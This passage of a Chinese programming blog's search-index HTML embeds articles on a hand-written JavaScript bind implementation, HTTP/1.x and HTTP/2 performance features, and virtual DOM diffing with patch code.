&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;bind实现&#34;&gt;bind实现&lt;/h2&gt;
&lt;p&gt;虽然bind和其余两个一样都是改变this的指向，但bind是返回一个新的函数，而不是直接执行&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;箭头函数的 &lt;code&gt;this&lt;/code&gt; 永远指向它所在的作用域&lt;/li&gt;
&lt;li&gt;函数作为构造函数用 &lt;code&gt;new&lt;/code&gt; 关键字调用时，不应该改变其 &lt;code&gt;this&lt;/code&gt; 指向，因为 &lt;code&gt;new绑定&lt;/code&gt; 的优先级高于 &lt;code&gt;显示绑定&lt;/code&gt; 和 &lt;code&gt;硬绑定&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Function.prototype.fanbind=function(context){
    if(typeof this!==&#39;function&#39;)
    throw new TypeError(`Error`)

    let _this =this
    let arr=Array.prototype.slice.call(arguments,1) //获取参数

    var profunction=function(){}//用于继承原型链

    var F=function (){

        if(this instanceof F){
            //如果是被当做构造函数调用，第一个参数作废 当为构造函数的时候this指向实例
            return _this.apply(this,arr.concat([...arguments]))
        }
            //否则就是原先的调用对象
            return _this.apply(context,arr.concat([...arguments]))
    }

    profunction.prototype=this.prototype //继承原本函数的原型
    F.prototype=new profunction()

    return F

}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;实例&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var value = 2;

var foo = {
    value: 1
};

function bar(name, age) {
    this.habit = &#39;shopping&#39;;
    console.log(this.value);
    console.log(name);
    console.log(age);
}

bar.prototype.friend = &#39;kevin&#39;;

var bindFoo = bar.fanbind(foo, &#39;daisy&#39;);

var obj = new bindFoo(&#39;18&#39;);
// undefined
// daisy
// 18
console.log(obj.habit);
console.log(obj.friend);
// shopping
// kevin
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
">call、apply、bind手写实现</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/http2ru-he-ti-sheng-luo-su-du/"" data-c="
          &lt;p&gt;虽然HTTP/1.1已经做了⼤量的优化，但是依然存在很多性能瓶 颈，依然不能满⾜我们⽇益变化的新需求，所以就有了今天要聊的HTTP/2。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;HTTP/1.1为⽹络效率做了⼤量的优化，最核⼼的有如下三种⽅式：&lt;/p&gt;
&lt;p&gt;1.增加了持久连接&lt;/p&gt;
&lt;p&gt;2.浏览器为每个域名最多同时维护6个TCP持久连接；&lt;/p&gt;
&lt;p&gt;3.使⽤CDN的实现域名分⽚机制。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;http11的主要问题&#34;&gt;HTTP/1.1的主要问题&lt;/h2&gt;
&lt;p&gt;HTTP/1.1&lt;strong&gt;对带宽的利⽤率却并不理想&lt;/strong&gt;，这也是HTTP/1.1的⼀个核⼼问题。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;带宽是指每秒最⼤能发送或者接收的字节数&lt;/strong&gt;。我们把每秒能发送的最⼤字节数称为&lt;strong&gt;上⾏带宽&lt;/strong&gt;，每秒能够接收的最⼤字节数称为&lt;strong&gt;下⾏带宽&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;⽐如我们常说的100M带宽，实际的下载速度能达到12.5M/S，⽽采⽤HTTP/1.1时，也许在加载⻚⾯资源时最⼤只能使⽤到2.5M/S，很难将12.5M全部⽤满。&lt;/p&gt;
&lt;p&gt;之所以会出现这个问题，主要是由以下三个原因导致的。&lt;/p&gt;
&lt;h3 id=&#34;第一个原因tcp的慢启动&#34;&gt;第⼀个原因，TCP的慢启动。&lt;/h3&gt;
&lt;p&gt;⼀旦⼀个TCP连接建⽴之后，就进⼊了发送数据状态，刚开始TCP协议会采⽤⼀个⾮常慢的速度去发送数 据，然后慢慢加快发送数据的速度，直到发送数据的速度达到⼀个理想状态，我们把这个过程称为慢启动。&lt;/p&gt;
&lt;p&gt;慢启动是TCP为了减少⽹络拥塞的⼀种策略，我们是没有办法改变的。&lt;/p&gt;
&lt;p&gt;⽽之所以说慢启动会带来性能问题，是因为⻚⾯中常⽤的⼀些关键资源⽂件本来就不⼤，如HTML⽂件、 CSS⽂件和JavaScript⽂件，通常这些⽂件在TCP连接建⽴好之后就要发起请求的，但这个过程是慢启动， 所以耗费的时间⽐正常的时间要多很多，这样就推迟了宝贵的⾸次渲染⻚⾯的时⻓了。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;第二个原因同时开启了多条tcp连接那么这些连接会竞争固定的带宽&#34;&gt;第⼆个原因，同时开启了多条TCP连接，那么这些连接会竞争固定的带宽。&lt;/h3&gt;
&lt;p&gt;系统同时建⽴了多条TCP连接，当带宽充⾜时，每条连接发送或者接收速度会慢慢向上增 加；⽽⼀旦带宽不⾜时，这些TCP连接⼜会减慢发送或者接收的速度。&lt;/p&gt;
&lt;p&gt;这样就会出现⼀个问题，因为有的TCP连接下载的是⼀些关键资源，如CSS⽂件、JavaScript⽂件等，⽽有 的TCP连接下载的是图⽚、视频等普通的资源⽂件，但是&lt;strong&gt;多条TCP连接之间⼜不能协商让哪些关键资源优先 下载，这样就有可能影响那些关键资源的下载速度了&lt;/strong&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;第三个原因http11队头阻塞的问题&#34;&gt;第三个原因，HTTP/1.1队头阻塞的问题。&lt;/h3&gt;
&lt;p&gt;在HTTP/1.1中使⽤持久连接时，虽然能公⽤⼀个TCP管道，但是&lt;strong&gt;在⼀个管道中同 ⼀时刻只能处理⼀个请求&lt;/strong&gt;，在当前的请求没有结束之前，其他的请求只能处于阻塞状态。&lt;/p&gt;
&lt;p&gt;但队头阻塞使得这些数据不能并⾏请求，所以队头阻塞是很不利于浏览器优化的。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;http2的多路复用&#34;&gt;HTTP/2的多路复⽤&lt;/h2&gt;
&lt;p&gt;慢启动和TCP连接之间相互竞争带宽是由于TCP本⾝的机 制导致的，⽽队头阻塞是由于HTTP/1.1的机制导致的。&lt;/p&gt;
&lt;p&gt;虽然TCP有问题，但是我们依然没有换掉TCP的能⼒，所以我们就要想办法去规避TCP的慢启动和TCP连接 之间的竞争问题。&lt;/p&gt;
&lt;p&gt;基于此，HTTP/2的思路就是&lt;strong&gt;⼀个域名只使⽤⼀个TCP⻓连接来传输数据&lt;/strong&gt;，这样整个⻚⾯资源的下载过程&lt;strong&gt;只需要⼀次慢启动&lt;/strong&gt;，同时也&lt;strong&gt;避免了多个TCP连接竞争带宽所带来的问题&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;另外，就是队头阻塞的问题，等待请求完成后才能去请求下⼀个资源，这种⽅式⽆疑是最慢的，所以 HTTP/2需要实现资源的&lt;strong&gt;并⾏请求&lt;/strong&gt;，也就是任何时候都可以将请求发送给服务器，⽽并不需要等待其他请求 的完成，然后服务器也可以随时返回处理好的请求资源给浏览器。&lt;/p&gt;
&lt;p&gt;HTTP/2的解决⽅案可以总结为：&lt;strong&gt;⼀个域名只使⽤⼀个TCP⻓连接和消除队头阻塞问题&lt;/strong&gt;。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1630305504443.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;该图就是HTTP/2最核⼼、最重要且最具颠覆性的&lt;strong&gt;多路复⽤机制&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;从图中会发现每个请求都有⼀个对应的 ID，如stream1表⽰index.html的请求，stream2表⽰foo.css的请求。这样在浏览器端，就可以随时将请求 发送给服务器了。&lt;/p&gt;
&lt;p&gt;HTTP/2使⽤了多路复⽤技术，可以将请求分成⼀帧⼀帧的数据去传输，这样带来了⼀个额外的好处，就是 当收到⼀个优先级⾼的请求时，⽐如接收到JavaScript或者CSS关键资源的请求，服务器可以暂停之前的请 求来优先处理关键资源的请求。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;多路复用的实现&#34;&gt;多路复⽤的实现&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1630305499377.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
HTTP/2添加了⼀个&lt;strong&gt;⼆进制分帧层&lt;/strong&gt;，结合图来分析下HTTP/2的请求和接收过程。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;⾸先，浏览器准备好请求数据，包括了请求⾏、请求头等信息，如果是POST⽅法，那么还要有请求体&lt;/li&gt;
&lt;li&gt;这些数据经过⼆进制分帧层处理之后，会被转换为⼀个个带有请求ID编号的帧，通过协议栈将这些帧发送 给服务器。&lt;/li&gt;
&lt;li&gt;服务器接收到所有帧之后，会将所有相同ID的帧合并为⼀条完整的请求信息。&lt;/li&gt;
&lt;li&gt;然后服务器处理该条请求，并将处理的响应⾏、响应头和响应体分别发送⾄⼆进制分帧层。&lt;/li&gt;
&lt;li&gt;同样，⼆进制分帧层会将这些响应数据转换为⼀个个带有请求ID编号的帧，经过协议栈发送给浏览器。&lt;/li&gt;
&lt;li&gt;浏览器接收到响应帧之后，会根据ID编号将帧的数据提交给对应的请求。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;http2其他特性&#34;&gt;HTTP/2其他特性&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;多路复⽤&lt;/strong&gt;是HTTP/2的最核⼼功能，&lt;strong&gt;它能实现资源的并⾏传输&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;基于⼆进制分帧层，HTTP/2还附带实现了很多其他功能。&lt;/p&gt;
&lt;h3 id=&#34;可以设置请求的优先级&#34;&gt;可以设置请求的优先级&lt;/h3&gt;
&lt;p&gt;浏览器中有些数据是⾮常重要的，但是在发送请求时，重要的请求可能会晚于那些不怎么重要的请 求，如果服务器按照请求的顺序来回复数据，那么这个重要的数据就有可能推迟很久才能送达浏览器，这对 于⽤⼾体验来说是⾮常不友好的&lt;/p&gt;
&lt;p&gt;为了解决这个问题，HTTP/2提供了请求优先级，可以在发送请求时，标上该请求的优先级，这样服务器接 收到请求之后，会优先处理优先级⾼的请求。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;服务器推送&#34;&gt;服务器推送&lt;/h3&gt;
&lt;p&gt;除了设置请求的优先级外，HTTP/2还可以直接将数据提前推送到浏览器。&lt;/p&gt;
&lt;p&gt;可以想象这样⼀个场景，当⽤ ⼾请求⼀个HTML⻚⾯之后，服务器知道该HTML⻚⾯会引⽤⼏个重要的JavaScript⽂件和CSS⽂件，那么在接收到HTML请求之后，附带将要使⽤的CSS⽂件和JavaScript⽂件⼀并发送给浏览器，这样当浏览器解析完HTML⽂件之后，就能直接拿到需要的CSS⽂件和JavaScript⽂件，这对⾸次打开⻚⾯的速度起到了⾄关重要的作⽤。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;头部压缩&#34;&gt;头部压缩&lt;/h3&gt;
&lt;p&gt;⽆论是HTTP/1.1还是HTTP/2，它们都有请求头和响应头，这是浏览器和服务器的通信语⾔。&lt;/p&gt;
&lt;p&gt;HTTP/2对请求头和响应头进⾏了压缩，提升了传输效率。&lt;/p&gt;
">HTTP2：如何提升⽹络速度？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/http1http-xing-neng-you-hua/"" data-c="
          &lt;p&gt;HTTP是浏览器中&lt;strong&gt;最重要&lt;/strong&gt;且&lt;strong&gt;使⽤最多&lt;/strong&gt;的协议，是浏览器和服 务器之间的通信语⾔，也是互联⽹的基⽯。&lt;/p&gt;
&lt;h2 id=&#34;超文本传输协议http09&#34;&gt;超⽂本传输协议HTTP/0.9&lt;/h2&gt;
&lt;p&gt;HTTP/0.9是于1991年提出的，主要⽤于学术交流，需求很简单⸺ ⽤来在⽹络之间传递HTML超⽂本的内容，所以被称为超⽂本传输协议。它的实现也很简单，采 ⽤了基于请求响应的模式，从客⼾端发出请求，服务器返回数据。&lt;/p&gt;
&lt;p&gt;HTTP/0.9的⼀个完整的请求流程&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;因为HTTP都是基于TCP协议的，所以客⼾端先要根据IP地址、端⼝和服务器建⽴TCP连接，⽽建⽴连接 的过程就是TCP协议三次握⼿的过程。&lt;/li&gt;
&lt;li&gt;建⽴好连接之后，会发送⼀个GET请求⾏的信息，如GET /index.html⽤来获取index.html。&lt;/li&gt;
&lt;li&gt;服务器接收请求信息之后，读取对应的HTML⽂件，并将数据以ASCII字符流返回给客⼾端。&lt;/li&gt;
&lt;li&gt;HTML⽂档传输完成后，断开连接。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1630129704198.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
总的来说，当时的需求很简单，就是⽤来传输体积很⼩的HTML⽂件，而没有其他的操作，所以HTTP/0.9的实现有以下三个特点。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;只有⼀个请求⾏，并没有&lt;strong&gt;HTTP请求头和请求体&lt;/strong&gt;，因为只需要⼀个请求⾏就可以完整表达客⼾端 的需求了。&lt;/li&gt;
&lt;li&gt;服务器也没有返回头信息，这是因为服务器端并不需要告诉客⼾端太多信息，只需要返回数据就 可以了。&lt;/li&gt;
&lt;li&gt;返回的⽂件内容是以ASCII字符流来传输的，因为都是HTML格式的⽂件，所以使⽤ASCII字节码 来传输是最合适的&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;被浏览器推动的http10&#34;&gt;被浏览器推动的HTTP/1.0&lt;/h2&gt;
&lt;p&gt;⾸先在浏览器中展⽰的不单是HTML⽂件了，还包括了JavaScript、CSS、图⽚、⾳频、视频等不同类型的 ⽂件。&lt;strong&gt;因此⽀持多种类型的⽂件下载是HTTP/1.0的⼀个核⼼诉求&lt;/strong&gt;，⽽且⽂件格式不仅仅局限于ASCII编码， 还有很多其他类型编码的⽂件。&lt;/p&gt;
&lt;h3 id=&#34;实现多种类型文件的下载&#34;&gt;实现多种类型⽂件的下载&lt;/h3&gt;
&lt;p&gt;HTTP/1.0引⼊了请求头和响应头，它们都是以为Key-Value形式保存的，在HTTP发送请求时，会带上请求 头信息，服务器返回数据时，会先返回响应头信息。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1630129699218.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;要⽀持多种类型的⽂件，就需要解决以下⼏个问题。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;⾸先，浏览器需要知道服务器返回的数据是什么类型的，然后浏览器才能根据不同的数据类型做针对性的 处理。&lt;/li&gt;
&lt;li&gt;为了减轻传输性 能，服务器会对数据进⾏压缩后再传输，所以浏览器需要知道服务器压缩的⽅法。&lt;/li&gt;
&lt;li&gt;服务器需要对不同的地区提供不同的 语⾔版本，这就需要浏览器告诉服务器它想要什么语⾔版本的⻚⾯。&lt;/li&gt;
&lt;li&gt;为了能够准确地读取⽂ 件，浏览器需要知道⽂件的编码类型。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;基于以上问题，&lt;strong&gt;HTTP/1.0的⽅案是通过请求头和响应头来进⾏协商&lt;/strong&gt;，在发起请求时候会通过HTTP请求头告 诉服务器它期待服务器返回什么类型的⽂件、采取什么形式的压缩、提供什么语⾔的⽂件以及⽂件的具体编 码。最终发送出来的&lt;strong&gt;请求头&lt;/strong&gt;内容如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;accept: text/html
accept-encoding: gzip, deflate, br
accept-Charset: ISO-8859-1,utf-8
accept-language: zh-CN,zh
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第一行表示服务器返回的是html类型的文件；&lt;/p&gt;
&lt;p&gt;第二行表示期望服务器可以采取gzip及其他两种中的一种进行压缩；&lt;/p&gt;
&lt;p&gt;第三行表示期望返回的文件编码是UTF-8或者另外一种；&lt;/p&gt;
&lt;p&gt;第四行是期望页面的优先语言是中文。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;服务器接收到浏览器发送过来的请求头信息之后，会根据请求头的信息来准备响应数据。&lt;/p&gt;
&lt;p&gt;不过有时候会有⼀ 些意外情况发⽣，⽐如浏览器请求的压缩类型是gzip，但是服务器不⽀持gzip，只⽀持br压缩，那么它会通 过响应头中的content-encoding字段告诉浏览器最终的压缩类型，也就是说最终浏览器需要根据&lt;strong&gt;响应头&lt;/strong&gt;的 信息来处理数据。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;content-encoding: br
content-type: text/html; charset=UTF-8
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;HTTP/1.0除了对多⽂件提供良好的⽀持外，还依据当时实际的需求引⼊了很多其他的特性，这些特性都是 通过请求头和响应头来实现的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有的请求服务器可能⽆法处理，或者处理出错，这时候就需要告诉浏览器服务器最终处理该请求的情况， 这就引⼊了&lt;strong&gt;状态码&lt;/strong&gt;。状态码是通过响应⾏的⽅式来通知浏览器的。&lt;/li&gt;
&lt;li&gt;为了减轻服务器的压⼒，在HTTP/1.0中提供了&lt;strong&gt;Cache机制&lt;/strong&gt;，⽤来缓存已经下载过的数据。&lt;/li&gt;
&lt;li&gt;服务器需要统计客⼾端的基础信息，⽐如Windows和macOS的⽤⼾数量分别是多少，所以HTTP/1.0的请 求头中还加⼊了&lt;strong&gt;⽤⼾代理&lt;/strong&gt;的字段。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;缝缝补补的http11&#34;&gt;缝缝补补的HTTP/1.1&lt;/h2&gt;
&lt;h3 id=&#34;改进持久连接&#34;&gt;改进持久连接&lt;/h3&gt;
&lt;p&gt;HTTP/1.0每进⾏⼀次HTTP通信，都需要经历建⽴TCP连接、传输HTTP数据和断开TCP连接三个阶段&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1630129691388.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;如 果在下载每个⽂件的时候，都需要经历建⽴TCP连接、传输数据和断开连接这样的步骤，⽆疑会增加⼤量⽆ 谓的开销。&lt;/p&gt;
&lt;p&gt;为了解决这个问题，&lt;strong&gt;HTTP/1.1中增加了持久连接的⽅法，它的特点是在⼀个TCP连接上可以传输多个HTTP 请求，只要浏览器或者服务器没有明确断开连接，那么该TCP连接会⼀直保持。&lt;/strong&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1630129684542.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;HTTP的持久连接可以&lt;strong&gt;有效减少TCP建⽴连接和断开连接的次数，这样的好处是减少了服 务器额外的负担，并提升整体HTTP的请求时⻓&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;如果不想要采⽤持久连接，可以在HTTP请求头中加上&lt;strong&gt;Connection: close&lt;/strong&gt;。⽬前浏览器中对于同⼀个域名，默 认允许同时建⽴6个TCP持久连接。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;不成熟的http管线化&#34;&gt;不成熟的HTTP管线化&lt;/h3&gt;
&lt;p&gt;持久连接虽然能减少TCP的建⽴和断开次数，但是它&lt;strong&gt;需要等待前⾯的请求返回之后，才能进⾏下⼀次请求&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;如果TCP通道中的某个请求因为某些原因没有及时返回，那么就会阻塞后⾯的所有请求，这就是著名的&lt;strong&gt;队头阻塞&lt;/strong&gt;的问题&lt;/p&gt;
&lt;p&gt;HTTP/1.1中的管线化是指将多个HTTP请求整批 提交给服务器的技术，虽然可以整批发送请求，不过服务器依然需要根据请求顺序来回复浏览器的请求。但是由于各种原因，它们最终都放弃了管线化技术。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;提供虚拟主机的支持&#34;&gt;提供虚拟主机的⽀持&lt;/h3&gt;
&lt;p&gt;在HTTP/1.0中，每个域名绑定了⼀个唯⼀的IP地址，因此⼀个服务器只能⽀持⼀个域名。&lt;/p&gt;
&lt;p&gt;但是随着虚拟主 机技术的发展，需要实现在⼀台物理主机上绑定多个虚拟主机，每个虚拟主机都有⾃⼰的单独的域名，这些 单独的域名都共⽤同⼀个IP地址。&lt;/p&gt;
&lt;p&gt;因此，HTTP/1.1的请求头中增加了&lt;strong&gt;Host&lt;/strong&gt;字段，⽤来表⽰当前的域名地址，这样服务器就可以根据不同的Host值做不同的处理。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;对动态生成的内容提供了完美支持&#34;&gt;对动态⽣成的内容提供了完美⽀持&lt;/h3&gt;
&lt;p&gt;在设计HTTP/1.0时，需要在响应头中设置完整的数据⼤⼩，如Content-Length: 901，这样浏览器就可 以根据设置的数据⼤⼩来接收数据。&lt;/p&gt;
&lt;p&gt;不过随着服务器端的技术发展，很多⻚⾯的内容都是动态⽣成的，因此 在传输数据之前并不知道最终的数据⼤⼩，这就导致了浏览器不知道何时会接收完所有的⽂件数据。&lt;/p&gt;
&lt;p&gt;HTTP/1.1通过引⼊&lt;strong&gt;Chunk transfer&lt;/strong&gt;机制来解决这个问题，服务器会将数据分割成若⼲个任意⼤⼩的数据 块，&lt;strong&gt;每个数据块发送时会附上上个数据块的⻓度，最后使⽤⼀个零⻓度的块作为发送数据完成的标志&lt;/strong&gt;。这样 就提供了对动态内容的⽀持。&lt;/p&gt;
&lt;br&gt;
">HTTP1：HTTP性能优化</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/xu-ni-domxu-ni-dom-he-shi-ji-de-dom-you-he-bu-tong/"" data-c="
          &lt;h2 id=&#34;dom的缺陷&#34;&gt;DOM的缺陷&lt;/h2&gt;
&lt;p&gt;对于js对DOM的操作，例如&lt;code&gt;document.body.appendChild(node)&lt;/code&gt;往body节点上添加⼀个元素后会引发⼀系列的连锁反应，&lt;/p&gt;
&lt;p&gt;⾸先渲染引擎会将node节点添加到body节点之上，然后触发样式计算、布局、绘制、栅格化、合成等任务，我们把这⼀过程称为&lt;strong&gt;重排&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;除了重排之外，还有可能引起重绘或者合成操作，形象地理解就是**“牵⼀发⽽动全⾝”**。&lt;/p&gt;
&lt;p&gt;对于DOM的不当操作还有可能引发&lt;strong&gt;强制同步&lt;/strong&gt;布局和&lt;strong&gt;布局抖动&lt;/strong&gt;的问题&lt;/p&gt;
&lt;p&gt;这些操作都会⼤⼤降低渲染效率。因此，对于DOM的操作我们时刻都需要⾮常⼩⼼谨慎。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;什么是虚拟dom&#34;&gt;什么是虚拟DOM&lt;/h2&gt;
&lt;p&gt;虚拟DOM解决了哪些事情&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将⻚⾯改变的内容应⽤到虚拟DOM上，⽽不是直接应⽤到DOM上&lt;/li&gt;
&lt;li&gt;变化被应⽤到虚拟DOM上时，虚拟DOM并不急着去渲染⻚⾯，⽽仅仅是调整虚拟DOM的内部状态，这样 操作虚拟DOM的代价就变得⾮常轻了。&lt;/li&gt;
&lt;li&gt;在虚拟DOM收集到⾜够的改变时，再把这些变化⼀次性应⽤到真实的DOM上。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629874748933.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;p&gt;DOM结构&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;ul id=&amp;quot;list&amp;quot;&amp;gt;
    &amp;lt;li class=&amp;quot;item&amp;quot;&amp;gt;哈哈&amp;lt;/li&amp;gt;
    &amp;lt;li class=&amp;quot;item&amp;quot;&amp;gt;呵呵&amp;lt;/li&amp;gt;
    &amp;lt;li class=&amp;quot;item&amp;quot;&amp;gt;嘿嘿&amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;虚拟DOM&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let oldVDOM = { // 旧虚拟DOM
        tagName: &#39;ul&#39;, // 标签名
        props: { // 标签属性
            id: &#39;list&#39;
        },
        children: [ // 标签子节点
            {
                tagName: &#39;li&#39;, props: { class: &#39;item&#39; }, children: [&#39;哈哈&#39;]
            },
            {
                tagName: &#39;li&#39;, props: { class: &#39;item&#39; }, children: [&#39;呵呵&#39;]
            },
            {
                tagName: &#39;li&#39;, props: { class: &#39;item&#39; }, children: [&#39;嘿嘿&#39;]
            },
        ]
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;虚拟DOM到底怎么运⾏的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;创建阶段&lt;/strong&gt;。⾸先依据JSX和基础数据创建出来虚拟DOM，它反映了真实的DOM树的结构。然后由虚拟 DOM树创建出真实DOM树，真实的DOM树⽣成完后，再触发渲染流⽔线往屏幕输出⻚⾯。（这个阶段并没有体现虚拟DOM的优化）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;更新阶段&lt;/strong&gt;。如果数据发⽣了改变，那么就需要根据新的数据创建⼀个新的虚拟DOM树；然后使用diff算法⽐较两 个树，找出变化的地⽅，并把变化的地⽅⼀次性更新到真实的DOM树上；最后渲染引擎更新渲染流⽔ 线，并⽣成新的⻚⾯。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;什么是diff算法&#34;&gt;什么是Diff算法&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Diff算法是一种对比算法&lt;/strong&gt;。对比两者是&lt;code&gt;旧虚拟DOM和新虚拟DOM&lt;/code&gt;，对比出是哪个&lt;code&gt;虚拟节点&lt;/code&gt;更改了，找出这个&lt;code&gt;虚拟节点&lt;/code&gt;，并只更新这个虚拟节点所对应的&lt;code&gt;真实节点&lt;/code&gt;，而不用更新其他数据没发生改变的节点，实现&lt;code&gt;精准&lt;/code&gt;地更新真实DOM，进而&lt;code&gt;提高效率&lt;/code&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;diff同层对比&#34;&gt;Diff同层对比&lt;/h3&gt;
&lt;p&gt;新旧虚拟DOM对比的时候，Diff算法比较只会在同层级进行, 不会跨层级比较。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629874739217.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h3 id=&#34;diff对比流程&#34;&gt;Diff对比流程&lt;/h3&gt;
&lt;p&gt;当数据改变时，会触发&lt;code&gt;setter&lt;/code&gt;，并且通过&lt;code&gt;Dep.notify&lt;/code&gt;去通知所有&lt;code&gt;订阅者Watcher&lt;/code&gt;，订阅者们就会调用&lt;code&gt;patch方法&lt;/code&gt;，给真实DOM打补丁，更新相应的视图。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;patch方法&#34;&gt;patch方法&lt;/h3&gt;
&lt;p&gt;这个方法作用就是，对比当前同层的虚拟节点是否为同一种类型的标签&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;是：继续执行&lt;code&gt;patchVnode方法&lt;/code&gt;进行深层比对&lt;/li&gt;
&lt;li&gt;否：没必要比对了，直接整个节点替换成&lt;code&gt;新虚拟节点&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;patch&lt;/code&gt;的核心原理代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-jsx&#34;&gt;function patch(oldVnode, newVnode) {
  // 比较是否为一个类型的节点
  if (sameVnode(oldVnode, newVnode)) {
    // 是：继续进行深层比较
    patchVnode(oldVnode, newVnode)
  } else {
    // 否
    const oldEl = oldVnode.el // 旧虚拟节点的真实DOM节点
    const parentEle = api.parentNode(oldEl) // 获取父节点
    createEle(newVnode) // 创建新虚拟节点对应的真实DOM节点
    if (parentEle !== null) {
      api.insertBefore(parentEle, vnode.el, api.nextSibling(oEl)) // 将新元素添加进父元素
      api.removeChild(parentEle, oldVnode.el)  // 移除以前的旧元素节点
      // 设置null，释放内存
      oldVnode = null
    }
  }

  return newVnode
}
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;samevnode方法&#34;&gt;sameVnode方法&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sameVnode&lt;/code&gt;方法判断是否为同一类型节点&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-jsx&#34;&gt;function sameVnode(oldVnode, newVnode) {
  return (
